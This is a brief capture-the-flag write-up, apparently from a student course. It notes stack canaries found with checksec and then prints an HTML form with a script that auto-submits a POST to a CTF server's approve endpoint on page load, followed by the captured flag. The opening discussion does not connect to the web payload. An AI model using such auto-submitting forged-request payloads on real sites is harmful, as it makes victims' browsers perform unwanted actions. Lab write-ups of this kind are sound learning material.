# Optional CTF - Apply for a flag II

- We started this challenge by checking what were the configurations of the _program_ file (using the _checksec_ function). We can see in the image below that this file is protected with canary's. So, writing in the stack would be a tough task.

<img src="CTFs/Opcionals/Img/2-Final_Format/1.checksec.png" alt="file print - result (flag)" width="70%"/><br/>

```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/71b93db6ec908d8868bed4aba06b5977fc8aaaa8/approve" role="form">     
    <div class="submit">         
        <input type="submit" id="giveflag" value="Give the flag">    
    </div> 
</form>  

<script type="text/javascript"> 	
    document.querySelector('#giveflag').click(); 
</script>
``` 

### Flag

`flag{4c8515b3a115ecf15875944a6c5738bd}`
